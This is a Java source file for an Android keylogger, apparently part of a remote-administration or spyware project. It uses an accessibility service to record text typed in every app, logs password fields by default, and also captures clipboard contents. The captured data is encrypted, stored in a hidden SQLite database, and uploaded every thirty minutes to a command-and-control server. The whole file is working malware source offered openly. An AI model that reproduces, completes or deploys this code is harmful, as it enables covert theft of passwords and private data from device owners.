package com.tarjon.admin.utils;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteStatement;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.tarjon.admin.network.C2Connection;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Keylogger for capturing user input across the device.
 * Uses Accessibility Service to monitor text input and captures clipboard data.
 */
public class Keylogger {

    private static final String TAG = "Keylogger";
    
    private Context context;
    private KeyloggerDatabase database;
    private C2Connection c2Connection;
    private EncryptionManager encryptionManager;
    
    // Clipboard monitoring
    private ClipboardManager clipboardManager;
    private String lastClipboardText = "";
    
    // Settings
    private boolean logKeystrokes = true;
    private boolean logClipboard = true;
    private boolean logPasswordFields = true;
    private boolean encryptLogs = true;
    
    // Current input tracking
    private String currentPackage = "";
    private String currentActivity = "";
    private String currentInputField = "";
    private boolean isPasswordField = false;
    private StringBuilder inputBuffer = new StringBuilder();
    
    // Auto-upload
    private ScheduledExecutorService scheduledExecutor;
    private static final int DEFAULT_UPLOAD_INTERVAL = 30; // minutes
    
    public Keylogger(Context context) {
        this.context = context;
        this.database = new KeyloggerDatabase(context);
        this.encryptionManager = new EncryptionManager();
        this.c2Connection = new C2Connection(context, encryptionManager);
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        
        // Start clipboard monitoring
        startClipboardMonitoring();
        
        // Schedule periodic uploads
        schedulePeriodicUploads(DEFAULT_UPLOAD_INTERVAL);
    }
    
    /**
     * Start monitoring clipboard changes
     */
    private void startClipboardMonitoring() {
        if (clipboardManager != null && logClipboard) {
            clipboardManager.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
                @Override
                public void onPrimaryClipChanged() {
                    captureClipboardData();
                }
            });
        }
    }
    
    /**
     * Schedule periodic upload of keylog data
     * @param intervalMinutes Interval in minutes
     */
    private void schedulePeriodicUploads(int intervalMinutes) {
        if (scheduledExecutor != null) {
            scheduledExecutor.shutdownNow();
        }
        
        scheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        scheduledExecutor.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                uploadKeylogData();
            }
        }, intervalMinutes, intervalMinutes, TimeUnit.MINUTES);
    }
    
    /**
     * Process accessibility event for keylogging
     * @param service AccessibilityService instance
     * @param event AccessibilityEvent to process
     */
    public void processAccessibilityEvent(AccessibilityService service, AccessibilityEvent event) {
        if (!logKeystrokes) {
            return;
        }
        
        try {
            int eventType = event.getEventType();
            
            // Track current package and activity
            if (event.getPackageName() != null) {
                currentPackage = event.getPackageName().toString();
            }
            
            // Get class name (activity) if available
            if (event.getClassName() != null) {
                currentActivity = event.getClassName().toString();
            }
            
            // Process text changes and input
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    processTextChangeEvent(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    processInputFieldFocus(event, service);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    // App or screen changed, save current input buffer if not empty
                    if (inputBuffer.length() > 0) {
                        saveCurrentInput();
                    }
                    break;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event: " + e.getMessage(), e);
        }
    }
    
    /**
     * Process text change events to capture input
     */
    private void processTextChangeEvent(AccessibilityEvent event) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            CharSequence text = event.getText().get(0);
            if (text != null) {
                // Check if this is a new input field
                if (event.getSource() != null && 
                    event.getSource().getClassName() != null &&
                    !event.getSource().getClassName().equals(currentInputField)) {
                    
                    // Save previous input
                    if (inputBuffer.length() > 0) {
                        saveCurrentInput();
                    }
                    
                    // Update current input field
                    currentInputField = event.getSource().getClassName().toString();
                    
                    // Check if password field
                    isPasswordField = isPasswordField(event.getSource());
                }
                
                // Update input buffer
                inputBuffer.setLength(0);
                inputBuffer.append(text);
                
                // If real-time logging needed, save immediately
                // Otherwise, wait for focus change or app change
                if (isPasswordField && !logPasswordFields) {
                    inputBuffer.setLength(0);
                }
            }
        }
    }
    
    /**
     * Process input field focus events
     */
    private void processInputFieldFocus(AccessibilityEvent event, AccessibilityService service) {
        // Save current input buffer if not empty
        if (inputBuffer.length() > 0) {
            saveCurrentInput();
        }
        
        // Get new field information
        if (event.getSource() != null) {
            if (event.getSource().getClassName() != null) {
                currentInputField = event.getSource().getClassName().toString();
            }
            
            // Check if password field
            isPasswordField = isPasswordField(event.getSource());
            
            // Reset input buffer
            inputBuffer.setLength(0);
            
            // If text is already present in the field, capture it
            if (event.getSource().getText() != null) {
                inputBuffer.append(event.getSource().getText());
            }
        }
    }
    
    /**
     * Check if field is a password field
     */
    private boolean isPasswordField(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }
        
        // Check if password input type or has password-related content description
        boolean isPassword = node.isPassword();
        
        if (!isPassword && node.getContentDescription() != null) {
            String description = node.getContentDescription().toString().toLowerCase();
            isPassword = description.contains("password") || 
                         description.contains("pass") || 
                         description.contains("pin") || 
                         description.contains("credential");
        }
        
        // Check field hint text
        if (!isPassword && node.getHintText() != null) {
            String hint = node.getHintText().toString().toLowerCase();
            isPassword = hint.contains("password") || 
                         hint.contains("pass") || 
                         hint.contains("pin") ||  
                         hint.contains("credential");
        }
        
        return isPassword;
    }
    
    /**
     * Save the current input buffer to the database
     */
    private void saveCurrentInput() {
        if (inputBuffer.length() == 0) {
            return;
        }
        
        String input = inputBuffer.toString();
        
        // Don't log passwords if not enabled
        if (isPasswordField && !logPasswordFields) {
            inputBuffer.setLength(0);
            return;
        }
        
        // Encrypt input if enabled
        if (encryptLogs) {
            input = encryptionManager.encrypt(input);
        }
        
        // Save to database
        database.addKeystroke(
                currentPackage,
                currentActivity,
                currentInputField,
                input,
                isPasswordField,
                System.currentTimeMillis(),
                encryptLogs
        );
        
        // Reset buffer
        inputBuffer.setLength(0);
    }
    
    /**
     * Capture clipboard data
     */
    private void captureClipboardData() {
        if (!logClipboard || clipboardManager == null || !clipboardManager.hasPrimaryClip()) {
            return;
        }
        
        try {
            CharSequence text = clipboardManager.getPrimaryClip().getItemAt(0).getText();
            if (text != null) {
                String clipText = text.toString();
                
                // Avoid duplicates
                if (clipText.equals(lastClipboardText)) {
                    return;
                }
                
                lastClipboardText = clipText;
                
                // Encrypt if enabled
                String savedText = clipText;
                if (encryptLogs) {
                    savedText = encryptionManager.encrypt(clipText);
                }
                
                // Save to database
                database.addClipboard(
                        currentPackage,
                        savedText,
                        System.currentTimeMillis(),
                        encryptLogs
                );
            }
        } catch (Exception e) {
            Log.e(TAG, "Error capturing clipboard: " + e.getMessage(), e);
        }
    }
    
    /**
     * Upload keylog data to C2 server
     */
    public void uploadKeylogData() {
        try {
            // Get keystrokes
            List<Map<String, String>> keystrokes = database.getKeystrokes(100);
            if (!keystrokes.isEmpty()) {
                // Send to server
                c2Connection.sendKeylogData(keystrokes.get(0)); // Simplified, should send batches
                
                // Mark as sent
                database.markKeystrokesAsUploaded(keystrokes);
            }
            
            // Get clipboard entries
            List<Map<String, String>> clipboardEntries = database.getClipboardEntries(100);
            if (!clipboardEntries.isEmpty()) {
                // Send to server
                c2Connection.sendClipboardData(clipboardEntries.get(0)); // Simplified, should send batches
                
                // Mark as sent
                database.markClipboardAsUploaded(clipboardEntries);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error uploading keylog data: " + e.getMessage(), e);
        }
    }
    
    /**
     * Clear collected keylog data
     */
    public void clearData() {
        database.clearData();
    }
    
    /**
     * Update keylogger settings
     * @param logKeystrokes Whether to log keystrokes
     * @param logClipboard Whether to log clipboard
     * @param logPasswordFields Whether to log password fields
     * @param encryptLogs Whether to encrypt logs
     * @param uploadIntervalMinutes Interval in minutes for auto-upload
     */
    public void updateSettings(boolean logKeystrokes, boolean logClipboard, 
                              boolean logPasswordFields, boolean encryptLogs,
                              int uploadIntervalMinutes) {
        this.logKeystrokes = logKeystrokes;
        this.logClipboard = logClipboard;
        this.logPasswordFields = logPasswordFields;
        this.encryptLogs = encryptLogs;
        
        // Update auto-upload schedule if changed
        if (uploadIntervalMinutes > 0) {
            schedulePeriodicUploads(uploadIntervalMinutes);
        }
    }
    
    /**
     * Clean up resources when keylogger is being destroyed
     */
    public void destroy() {
        if (scheduledExecutor != null) {
            scheduledExecutor.shutdownNow();
        }
    }
    
    /**
     * Database helper class for storing keystroke and clipboard data
     */
    private static class KeyloggerDatabase extends SQLiteOpenHelper {
        private static final String DATABASE_NAME = "keylogger.db";
        private static final int DATABASE_VERSION = 1;
        
        // Keystrokes table
        private static final String TABLE_KEYSTROKES = "keystrokes";
        private static final String KEY_ID = "id";
        private static final String KEY_PACKAGE = "package";
        private static final String KEY_ACTIVITY = "activity";
        private static final String KEY_FIELD = "field";
        private static final String KEY_INPUT = "input";
        private static final String KEY_IS_PASSWORD = "is_password";
        private static final String KEY_TIMESTAMP = "timestamp";
        private static final String KEY_IS_ENCRYPTED = "is_encrypted";
        private static final String KEY_UPLOADED = "uploaded";
        
        // Clipboard table
        private static final String TABLE_CLIPBOARD = "clipboard";
        private static final String KEY_SOURCE = "source";
        private static final String KEY_CONTENT = "content";
        
        public KeyloggerDatabase(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }
        
        @Override
        public void onCreate(SQLiteDatabase db) {
            // Create keystrokes table
            String CREATE_KEYSTROKES_TABLE = "CREATE TABLE " + TABLE_KEYSTROKES + "("
                    + KEY_ID + " INTEGER PRIMARY KEY,"
                    + KEY_PACKAGE + " TEXT,"
                    + KEY_ACTIVITY + " TEXT,"
                    + KEY_FIELD + " TEXT,"
                    + KEY_INPUT + " TEXT,"
                    + KEY_IS_PASSWORD + " INTEGER,"
                    + KEY_TIMESTAMP + " INTEGER,"
                    + KEY_IS_ENCRYPTED + " INTEGER,"
                    + KEY_UPLOADED + " INTEGER DEFAULT 0"
                    + ")";
            db.execSQL(CREATE_KEYSTROKES_TABLE);
            
            // Create clipboard table
            String CREATE_CLIPBOARD_TABLE = "CREATE TABLE " + TABLE_CLIPBOARD + "("
                    + KEY_ID + " INTEGER PRIMARY KEY,"
                    + KEY_SOURCE + " TEXT,"
                    + KEY_CONTENT + " TEXT,"
                    + KEY_TIMESTAMP + " INTEGER,"
                    + KEY_IS_ENCRYPTED + " INTEGER,"
                    + KEY_UPLOADED + " INTEGER DEFAULT 0"
                    + ")";
            db.execSQL(CREATE_CLIPBOARD_TABLE);
        }
        
        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            // On upgrade, drop old tables and recreate
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_KEYSTROKES);
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_CLIPBOARD);
            onCreate(db);
        }
        
        /**
         * Add keystroke to database
         */
        public void addKeystroke(String packageName, String activity, String field, 
                                String input, boolean isPassword, long timestamp, 
                                boolean isEncrypted) {
            SQLiteDatabase db = this.getWritableDatabase();
            
            // Use prepared statement for efficiency and security
            String sql = "INSERT INTO " + TABLE_KEYSTROKES + " (" +
                    KEY_PACKAGE + ", " +
                    KEY_ACTIVITY + ", " +
                    KEY_FIELD + ", " +
                    KEY_INPUT + ", " +
                    KEY_IS_PASSWORD + ", " +
                    KEY_TIMESTAMP + ", " +
                    KEY_IS_ENCRYPTED + ") VALUES (?, ?, ?, ?, ?, ?, ?)";
            
            SQLiteStatement statement = db.compileStatement(sql);
            statement.bindString(1, packageName != null ? packageName : "");
            statement.bindString(2, activity != null ? activity : "");
            statement.bindString(3, field != null ? field : "");
            statement.bindString(4, input != null ? input : "");
            statement.bindLong(5, isPassword ? 1 : 0);
            statement.bindLong(6, timestamp);
            statement.bindLong(7, isEncrypted ? 1 : 0);
            
            statement.executeInsert();
            statement.close();
            db.close();
        }
        
        /**
         * Add clipboard entry to database
         */
        public void addClipboard(String source, String content, long timestamp, boolean isEncrypted) {
            SQLiteDatabase db = this.getWritableDatabase();
            
            // Use prepared statement for efficiency and security
            String sql = "INSERT INTO " + TABLE_CLIPBOARD + " (" +
                    KEY_SOURCE + ", " +
                    KEY_CONTENT + ", " +
                    KEY_TIMESTAMP + ", " +
                    KEY_IS_ENCRYPTED + ") VALUES (?, ?, ?, ?)";
            
            SQLiteStatement statement = db.compileStatement(sql);
            statement.bindString(1, source != null ? source : "");
            statement.bindString(2, content != null ? content : "");
            statement.bindLong(3, timestamp);
            statement.bindLong(4, isEncrypted ? 1 : 0);
            
            statement.executeInsert();
            statement.close();
            db.close();
        }
        
        /**
         * Get keystrokes from database
         * @param limit Maximum number of entries to retrieve
         * @return List of keystroke entries
         */
        public List<Map<String, String>> getKeystrokes(int limit) {
            List<Map<String, String>> keystrokes = new ArrayList<>();
            
            SQLiteDatabase db = this.getReadableDatabase();
            Cursor cursor = db.query(
                    TABLE_KEYSTROKES,
                    new String[]{KEY_ID, KEY_PACKAGE, KEY_ACTIVITY, KEY_FIELD, KEY_INPUT, 
                                KEY_IS_PASSWORD, KEY_TIMESTAMP, KEY_IS_ENCRYPTED},
                    KEY_UPLOADED + "=?",
                    new String[]{"0"},
                    null,
                    null,
                    KEY_TIMESTAMP + " ASC",
                    String.valueOf(limit)
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> entry = new HashMap<>();
                    entry.put("id", cursor.getString(0));
                    entry.put("package", cursor.getString(1));
                    entry.put("activity", cursor.getString(2));
                    entry.put("field", cursor.getString(3));
                    entry.put("input", cursor.getString(4));
                    entry.put("is_password", cursor.getInt(5) == 1 ? "true" : "false");
                    
                    // Format timestamp for readability
                    long timestamp = cursor.getLong(6);
                    entry.put("timestamp", String.valueOf(timestamp));
                    entry.put("timestamp_formatted", formatTimestamp(timestamp));
                    
                    entry.put("is_encrypted", cursor.getInt(7) == 1 ? "true" : "false");
                    
                    keystrokes.add(entry);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            db.close();
            return keystrokes;
        }
        
        /**
         * Get clipboard entries from database
         * @param limit Maximum number of entries to retrieve
         * @return List of clipboard entries
         */
        public List<Map<String, String>> getClipboardEntries(int limit) {
            List<Map<String, String>> entries = new ArrayList<>();
            
            SQLiteDatabase db = this.getReadableDatabase();
            Cursor cursor = db.query(
                    TABLE_CLIPBOARD,
                    new String[]{KEY_ID, KEY_SOURCE, KEY_CONTENT, KEY_TIMESTAMP, KEY_IS_ENCRYPTED},
                    KEY_UPLOADED + "=?",
                    new String[]{"0"},
                    null,
                    null,
                    KEY_TIMESTAMP + " ASC",
                    String.valueOf(limit)
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> entry = new HashMap<>();
                    entry.put("id", cursor.getString(0));
                    entry.put("source", cursor.getString(1));
                    entry.put("content", cursor.getString(2));
                    
                    // Format timestamp for readability
                    long timestamp = cursor.getLong(3);
                    entry.put("timestamp", String.valueOf(timestamp));
                    entry.put("timestamp_formatted", formatTimestamp(timestamp));
                    
                    entry.put("is_encrypted", cursor.getInt(4) == 1 ? "true" : "false");
                    
                    entries.add(entry);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            db.close();
            return entries;
        }
        
        /**
         * Mark keystrokes as uploaded
         */
        public void markKeystrokesAsUploaded(List<Map<String, String>> keystrokes) {
            if (keystrokes.isEmpty()) {
                return;
            }
            
            SQLiteDatabase db = this.getWritableDatabase();
            
            // Extract IDs
            List<String> ids = new ArrayList<>();
            for (Map<String, String> entry : keystrokes) {
                ids.add(entry.get("id"));
            }
            
            // Use placeholders for SQL query
            String placeholders = TextUtils.join(",", Collections.nCopies(ids.size(), "?"));
            String sql = "UPDATE " + TABLE_KEYSTROKES + 
                         " SET " + KEY_UPLOADED + "=1" +
                         " WHERE " + KEY_ID + " IN (" + placeholders + ")";
            
            db.execSQL(sql, ids.toArray(new String[0]));
            db.close();
        }
        
        /**
         * Mark clipboard entries as uploaded
         */
        public void markClipboardAsUploaded(List<Map<String, String>> entries) {
            if (entries.isEmpty()) {
                return;
            }
            
            SQLiteDatabase db = this.getWritableDatabase();
            
            // Extract IDs
            List<String> ids = new ArrayList<>();
            for (Map<String, String> entry : entries) {
                ids.add(entry.get("id"));
            }
            
            // Use placeholders for SQL query
            String placeholders = TextUtils.join(",", Collections.nCopies(ids.size(), "?"));
            String sql = "UPDATE " + TABLE_CLIPBOARD + 
                         " SET " + KEY_UPLOADED + "=1" +
                         " WHERE " + KEY_ID + " IN (" + placeholders + ")";
            
            db.execSQL(sql, ids.toArray(new String[0]));
            db.close();
        }
        
        /**
         * Clear all data from the database
         */
        public void clearData() {
            SQLiteDatabase db = this.getWritableDatabase();
            db.delete(TABLE_KEYSTROKES, null, null);
            db.delete(TABLE_CLIPBOARD, null, null);
            db.close();
        }
        
        /**
         * Format timestamp to readable date string
         */
        private String formatTimestamp(long timestamp) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return sdf.format(new Date(timestamp));
        }
    }
}